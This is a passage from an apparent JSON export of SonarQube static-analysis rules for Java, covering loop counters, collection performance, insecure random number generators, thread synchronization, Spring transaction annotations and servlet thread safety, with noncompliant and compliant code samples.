i--) { // Compliant\n  System.out.println(\"Hello, world!\") // executed 10 times\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic void doSomething(String [] strings) {\n  for (int i = 0; i &lt; strings.length; i++) { // Compliant\n    String string = strings[i];\n    // ...\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>If the intention is to have an infinite loop or a loop terminated only by a break statement, use a <code>while</code> or a <code>do</code>\n<code>while</code> statement instead.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nfor (int i = 0; i &lt; 0; i++) { // Noncompliant, loop is not infinite\n  String event = waitForNextEvent();\n  if (event == \"terminate\") break;\n  processEvent(event);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nwhile (true) { // Compliant\n  String event = waitForNextEvent();\n  if (event == \"terminate\") break;\n  processEvent(event);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aTdGBQ\">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Integer_overflow\">Wikipedia - Integer overflow</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2251","summary":"A \"for\" loop update clause should move the counter in the right direction","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The time complexity of method calls on collections is not always obvious. For instance, for most collections the <code>size()</code> method takes\nconstant time, but the time required to execute <code>ConcurrentLinkedQueue.size()</code> is O(n), i.e. directly proportional to the number of\nelements in the collection. When the collection is large, this could therefore be an expensive operation.</p>\n<p>This rule raises an issue when the following O(n) methods are called outside of constructors on class fields:</p>\n<ul>\n  <li> <code>ArrayList</code>\n    <ul>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul>  </li>\n  <li> <code>LinkedList</code>\n    <ul>\n      <li> <code>get</code> </li>\n      <li> <code>contains</code> </li>\n    </ul>  </li>\n  <li> <code>ConcurrentLinkedQueue</code>\n    <ul>\n      <li> <code>size</code> </li>\n      <li> <code>contains</code> </li>\n    </ul>  </li>\n  <li> <code>ConcurrentLinkedDeque</code>\n    <ul>\n      <li> <code>size</code> </li>\n      <li> <code>contains</code> </li>\n    </ul>  </li>\n  <li> <code>CopyOnWriteArrayList</code>\n    <ul>\n      <li> <code>add</code> </li>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul>  </li>\n  <li> <code>CopyOnWriteArraySet</code>\n    <ul>\n      <li> <code>add</code> </li>\n      <li> <code>contains</code> </li>\n      <li> <code>remove</code> </li>\n    </ul>  </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nConcurrentLinkedQueue queue = new ConcurrentLinkedQueue();\n//...\nlog.info(\"Queue contains \" + queue.size() + \" elements\");  // Noncompliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2250","summary":"Collection methods with O(n) performance should be used carefully","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>PRNGs are algorithms that produce sequences of numbers that only approximate true randomness. While they are suitable for applications like\nsimulations or modeling, they are not appropriate for security-sensitive contexts because their outputs can be predictable if the internal state is\nknown.</p>\n<p>In contrast, cryptographically secure pseudorandom number generators (CSPRNGs) are designed to be secure against prediction attacks. CSPRNGs use\ncryptographic algorithms to ensure that the generated sequences are not only random but also unpredictable, even if part of the sequence or the\ninternal state becomes known. This unpredictability is crucial for security-related tasks such as generating encryption keys, tokens, or any other\nvalues that must remain confidential and resistant to guessing attacks.</p>\n<p>For example, the use of non-cryptographic PRNGs has led to vulnerabilities such as:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information. Therefore, it is critical to use CSPRNGs in any\nsecurity-sensitive application to ensure the robustness and security of the system.</p>\n<p>As the <code>java.util.Random</code> class relies on a non-cryptographic pseudorandom number generator, this class and relating\n<code>java.lang.Math.random()</code> method should not be used for security-critical applications or for protecting sensitive data. In such context,\nthe <code>java.security.SecureRandom</code> class which relies on a CSPRNG should be used in place.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use is a non-cryptographic PRNG. </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a cryptographically secure pseudo random number generator (CSPRNG) like \"java.security.SecureRandom\" in place of a non-cryptographic PRNG.\n  </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nRandom random = new Random(); // Sensitive use of Random\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSecureRandom random = new SecureRandom();\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation\">Secure\n  Random Number Generation Cheat Sheet</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-CRYPTO/\">Mobile AppSec Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/oTdGBQ\">CERT, MSC02-J.</a> - Generate strong random numbers </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2245","summary":"Using pseudorandom number generators (PRNGs) is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>In Java, the <code>Thread</code> class represents a thread of execution. Synchronization between threads is typically achieved using objects or\nshared resources.</p>\n<p>The methods <code>wait(â¦â)</code>, <code>notify()</code>, and <code>notifyAll()</code> are related to the underlying objectâs monitor and are\ndesigned to be called on objects that act as locks or monitors for synchronization. These methods are available on Java <code>Object</code> and,\ntherefore, automatically inherited by all objects, including <code>Thread.</code></p>\n<p>Calling these methods on a <code>Thread</code> may corrupt the behavior of the JVM, which relies on them to change the state of the thread\n(<code>BLOCKED,</code> <code>WAITING,</code>â¦â).</p>\n<h3>Noncompliant code example</h3>\n<pre>\nThread myThread = new Thread(new RunnableJob());\n...\nmyThread.wait(); // Noncompliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/lang/Thread.html\">Oracle Java SE - Thread</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/lang/Object.html\">Oracle Java SE - Object</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2236","summary":"Methods \"wait(...)\", \"notify()\" and \"notifyAll()\" should not be called on Thread instances","tags":["multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The <code>IllegalMonitorStateException</code> is an exception that occurs when a thread tries to perform an operation on an objectâs monitor that\nit does not own. This exception is typically thrown when a method like <code>wait()</code>, <code>notify()</code>, or <code>notifyAll()</code> is\ncalled outside a synchronized block or method.</p>\n<p><code>IllegalMonitorStateException</code> is specifically designed to be an unchecked exception to point out a programming mistake. This exception\nserves as a reminder for developers to rectify their code by correctly acquiring and releasing locks using synchronized blocks or methods. It also\nemphasizes the importance of calling monitor-related methods on the appropriate objects to ensure proper synchronization.</p>\n<p>Catching and handling this exception can mask underlying synchronization issues and lead to unpredictable behavior.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doSomething() {\n  try {\n    anObject.notify();\n  } catch(IllegalMonitorStateException e) { // Noncompliant\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doSomething() {\n  synchronized(anObject) {\n    anObject.notify();\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/lang/IllegalMonitorStateException.html\">Oracle Java SE -\n  IllegalMonitorStateException</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2235","summary":"\"IllegalMonitorStateException\" should not be caught","tags":["error-handling","multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When the names of parameters in a method call match the names of the method arguments, it contributes to clearer, more readable code. However, when\nthe names match, but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will likely lead\nto unexpected results.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic double divide(int divisor, int dividend) {\n  return divisor/dividend;\n}\n\npublic void doTheThing() {\n  int divisor = 15;\n  int dividend = 5;\n\n  double result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected\n  //...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic double divide(int divisor, int dividend) {\n  return divisor/dividend;\n}\n\npublic void doTheThing() {\n  int divisor = 15;\n  int dividend = 5;\n\n  double result = divide(divisor, dividend);\n  //...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2234","summary":"Parameters should be passed in the correct order","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>There are several reasons to avoid using this method:</p>\n<ol>\n  <li> It is optionally available only for result sets of type <code>ResultSet.TYPE_FORWARD_ONLY</code>. Database drivers will throw an exception if\n  not supported. </li>\n  <li> The method can be expensive to execute as the database driver may need to fetch ahead one row to determine whether the current row is the last\n  in the result set. The documentation of the method explicitly mentions this fact. </li>\n  <li> What \"the cursor is on the last row\" means for an empty <code>ResultSet</code> is unclear. Database drivers may return <code>true</code> or\n  <code>false</code> in this case . </li>\n</ol>\n<p><code>ResultSet.next()</code> is a good alternative to <code>ResultSet.isLast()</code> as it does not have the mentioned issues. It is always\nsupported and, as per specification, returns <code>false</code> for empty result sets.</p>\n<h2>How to fix it</h2>\n<p>Refactor your code to use <code>ResultSet.next()</code> instead of <code>ResultSet.isLast()</code>. Be cautious of its different semantics and side\neffects on cursor positioning in the result set. Verify that your program logic is still valid under these side effects and otherwise adjust it.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nResultSet results = stmt.executeQuery(\"SELECT name, address FROM PERSON\");\nStringBuilder sb = new StringBuilder();\nwhile (results.next() &amp;&amp; !results.isLast()) { // Noncompliant\n  sb.append(results.getString(\"name\") + \", \");\n}\nsb.append(results.getString(\"name\"));\nString formattedNames = sb.toString();\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nResultSet results = stmt.executeQuery(\"SELECT name, address FROM PERSON\");\nList&lt;String&gt; names = new ArrayList&lt;&gt;();\nwhile (results.next()) { // Compliant, and program logic refactored\n  names.add(results.getString(\"name\"));\n}\nString formattedNames =  names.stream().collect(Collectors.joining(\", \"));\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/sql/ResultSet.html#isLast--\">Java SE 8 API Specification: ResultSet.isLast()</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2232","summary":"\"ResultSet.isLast()\" should not be used","tags":["performance","pitfall","sql"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Marking a non-public method <code>@Async</code> or <code>@Transactional</code> is misleading because, up to version 5, Spring does not recognize\nnon-public methods, and so makes no provision for their proper invocation. Nor does Spring make provision for the methods invoked by the method it\ncalled. Since Spring 6, protected and package-private methods can be handled, but the issue remains for private methods.</p>\n<p>Therefore, marking a private method, for instance, @Transactional gives a false sense of security, and can lead to incorrect assumptions and\npotential bugs.</p>\n<h2>Exceptions</h2>\n<p>The rule targets all non-public methods for project using Spring up to Spring 5, but only private methods for Spring 6 because Spring 6 takes into\naccount all non-private methods.</p>\n<h2>How to fix it</h2>\n<p>Declare the method <code>public</code>. Note that this action alone does not resolve the issue of direct instance calls from within the same class\n(see rule {rule:java:S6809}), but it is a required precondition to fix it.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Async\nprivate Future&lt;String&gt; asyncMethodWithReturnType() { // Noncompliant, no proxy generated and\n    return \"Hellow, world!\";                         // can only be invoked from same class\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Async\npublic Future&lt;String&gt; asyncMethodWithReturnType() { // Compliant\n    return \"Hellow, world!\";\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/scheduling/annotation/Async.html\">Spring\n  Framework API - Annotation Interface Async</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/transaction/annotation/Transactional.html\">Spring\n  Framework API - Annotation Interface Transactional</a> </li>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/reference/6.2.6/data-access/transaction/declarative/annotations.html#transaction-declarative-annotations-method-visibility\">Method visibility and @Transactional in proxy mode</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-async\">Baeldung - How To Do @Async in Spring</a> </li>\n  <li> <a href=\"https://stackoverflow.com/questions/22561775/spring-async-ignored\">Stack Overflow - Spring @Async ignored</a> </li>\n  <li> <a href=\"https://stackoverflow.com/questions/4396284/does-spring-transactional-attribute-work-on-a-private-method\">Stack Overflow - Does Spring\n  @Transactional attribute work on a private method?</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2230","summary":"Methods with Spring proxying annotations should be public","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Transactional methods have a propagation type parameter in the @Transaction annotation that specifies the requirements about the transactional\ncontext in which the method can be called and how it creates, appends, or suspends an ongoing transaction.</p>\n<p>When an instance that contains transactional methods is injected, Spring uses proxy objects to wrap these methods with the actual transaction\ncode.</p>\n<p>However, if a transactional method is called from another method in the same class, the <code>this</code> argument is used as the receiver instance\ninstead of the injected proxy object, which bypasses the wrapper code. This results in specific transitions from one transactional method to another,\nwhich are not allowed:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>From</th>\n      <th>To</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>non-<code>@Transactional</code></p></td>\n      <td><p>MANDATORY, NESTED, REQUIRED, REQUIRES_NEW</p></td>\n    </tr>\n    <tr>\n      <td><p>MANDATORY</p></td>\n      <td><p>NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW</p></td>\n    </tr>\n    <tr>\n      <td><p>NESTED</p></td>\n      <td><p>NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW</p></td>\n    </tr>\n    <tr>\n      <td><p>NEVER</p></td>\n      <td><p>MANDATORY, NESTED, REQUIRED, REQUIRES_NEW</p></td>\n    </tr>\n    <tr>\n      <td><p>NOT_SUPPORTED</p></td>\n      <td><p>MANDATORY, NESTED, REQUIRED, REQUIRES_NEW</p></td>\n    </tr>\n    <tr>\n      <td><p>REQUIRED or <code>@Transactional</code></p></td>\n      <td><p>NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW</p></td>\n    </tr>\n    <tr>\n      <td><p>REQUIRES_NEW</p></td>\n      <td><p>NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW</p></td>\n    </tr>\n    <tr>\n      <td><p>SUPPORTS</p></td>\n      <td><p>MANDATORY, NESTED, NEVER, NOT_SUPPORTED, REQUIRED, REQUIRES_NEW</p></td>\n    </tr>\n  </tbody>\n</table>\n<h2>How to fix it</h2>\n<p>Change the corresponding functions into a compatible propagation type.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doTheThing() {\n  // ...\n  actuallyDoTheThing(); // Noncompliant, call from non-transactional to transactional\n}\n\n@Transactional\npublic void actuallyDoTheThing() {\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Transactional\npublic void doTheThing() {\n  // ...\n  actuallyDoTheThing(); // Compliant\n}\n\n@Transactional\npublic void actuallyDoTheThing() {\n  // ...\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n@Transactional\npublic void doTheThing() {\n  // ...\n  actuallyDoTheThing(); // Noncompliant, call from REQUIRED to REQUIRES_NEW\n}\n\n@Transactional(propagation = Propagation.REQUIRES_NEW)\npublic void actuallyDoTheThing() {\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n@Transactional\npublic void doTheThing() {\n  // ...\n  actuallyDoTheThing(); // Compliant, call from REQUIRED to MANDATORY\n}\n\n@Transactional(propagation = Propagation.MANDATORY)\npublic void actuallyDoTheThing() {\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/transaction/annotation/Propagation.html\">Spring\n  Framework 6 API: Enum Class propagation</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/transaction/annotation/Transactional.html\">Spring\n  Framework 6 API: Annotation Interface Transactional</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-framework/reference/data-access/transaction/declarative/tx-propagation.html\">Spring 6 Documentation:\n  Transaction Propagation</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/spring-transactional-propagation-isolation\">Baeldung: Transaction Propagation and Isolation in Spring\n  @Transactional</a> </li>\n  <li> <a href=\"https://dzone.com/articles/spring-transaction-propagation\">DZone: Spring Transaction Propagation in a Nutshell</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2229","summary":"Methods should not call same-class methods with incompatible \"@Transactional\" values","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>processHttpRequest</code> method and methods called from it can be executed by multiple threads within the same servlet instance, and\nstate changes to the instance caused by these methods are, therefore, not threadsafe.</p>\n<p>This is due to the servlet container creating only one instance of each servlet (<code>javax.servlet.http.HttpServlet</code>) and attaching a\ndedicated thread to each incoming HTTP request. The same problem exists for <code>org.apache.struts.action.Action</code> but with different\nmethods.</p>\n<p>To prevent unexpected behavior, avoiding mutable states in servlets is recommended. Mutable instance fields should either be refactored into local\nvariables or made immutable by declaring them <code>final</code>.</p>\n<h3>Exceptions</h3>\n<ul>\n  <li> Fields annotated with <code>@javax.inject.Inject</code>, <code>@javax.ejb.EJB</code>,\n  <code>@org.springframework.beans.factory.annotation.Autowired</code>, <code>@javax.annotation.Resource</code> </li>\n  <li> Fields initialized in <code>init()</code> or <code>init(ServletConfig config)</code> methods </li>\n</ul>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>If the field is never modified, declare it <code>final</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyServlet extends HttpServlet {\n  String apiVersion = \"0.9.1\"; // Noncompliant, field changes are not thread-safe\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyServlet extends HttpServlet {\n  final String apiVersion = \"0.9.1\"; // Compliant, field cannot be changed\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>If a field is modified within instance methods, refactor it into a local variable. That variable can be passed as an argument to other functions if\nneeded.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic class MyServlet extends HttpServlet {\n\n  String userName; // Noncompliant, field changes are not thread-safe\n\n  @Override\n  public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    userName = req.getParameter(\"userName\"); // Different threads may write concurrently to userName\n    resp.getOutputStream().print(getGreeting());\n  }\n\n  public String getGreeting() { // Unpredictable value in field userName\n    return \"Hello \"+userName+\"!\";\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic class MyServlet extends HttpServlet {\n\n  @Override\n  public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String userName = req.getParameter(\"userName\"); // Compliant, local variable instead instance field\n    resp.getOutputStream().print(getGreeting(userName));\n  }\n\n  public String getGreeting(String userName) { // Compliant, method argument instead instance field\n    return \"Hello \"+userName+\"!\";\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>If you still prefer instance state over local variables, consider using <code>ThreadLocal</code> fields. These fields provide a separate instance\nof their value for each thread.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\npublic class MyServlet extends HttpServlet {\n\n  String userName; // Noncompliant, field changes are not thread-safe\n\n  @Override\n  public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    userName = req.getParameter(\"userName\"); // Different threads may write concurrently to userName\n    resp.getOutputStream().print(getGreeting());\n  }\n\n  public String getGreeting() { // Unpredictable value in field userName\n    return \"Hello \"+userName+\"!\";\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\npublic class MyServlet extends HttpServlet {\n\n  final ThreadLocal&lt;String&gt; userName = new ThreadLocal&lt;&gt;(); // Compliant, field itself does not change\n\n  @Override\n  public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    userName.set(req.getParameter(\"userName\")); // Compliant, own value provided for every thread\n    resp.getOutputStream().print(getGreeting());\n  }\n\n  public String getGreeting() {\n    return \"Hello \"+userName.get()+\"!\"; // Compliant, own value provided for every thread\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>If you have a use case that requires a shared instance state between threads, declare the corresponding fields as <code>static</code> to indicate\nyour intention and awareness that there is only one instance of the servlet. However, the <code>static</code> modifier alone does not ensure thread\nsafety. Make sure also to take countermeasures against possible race conditions.</p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\npublic class MyServlet extends HttpServlet {\n\n  public long timestampLastRequest; // Noncompliant, field changes are not thread-safe\n\n  @Override\n  public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    timestampLastRequest = System.currentTimeMillis();\n    resp.getOutputStream().print(timestampLastRequest); // Race condition\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\npublic class MyServlet extends HttpServlet {\n\n  public static long timestampLastRequest; // Compliant, sharing state is our intention\n\n  @Override\n  public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    long timestamp;\n    synchronized (this) {\n      timestamp = timestampLastRequest; // No race condition, synchronized get &amp; set\n      timestampLastRequest = System.currentTimeMillis();\n    }\n    resp.getOutputStream().print(timestamp);\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.devinline.com/2013/08/how-to-make-thread-safe-servlet.html\">Nikhil Ranjan: How to make thread safe servlet ?</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222567\">Application Security and\n  Development: V-222567</a> - The application must not be vulnerable to race conditions. </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2226","summary":"Servlets should not have mutable instance fields","tags":["multi-threading","struts","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Calling <code>toString()</code> or <code>clone()</code> on an object should always return a string or an object. Returning <code>null</code>\ninstead contravenes the methodâs implicit contract.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic String toString () {\n  if (this.collection.isEmpty()) {\n    return null; // Noncompliant\n  } else {\n    // ...\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic String toString () {\n  if (this.collection.isEmpty()) {\n    return \"\";\n  } else {\n    // ...\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/476\">CWE-476 - NULL Pointer Dereference</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required 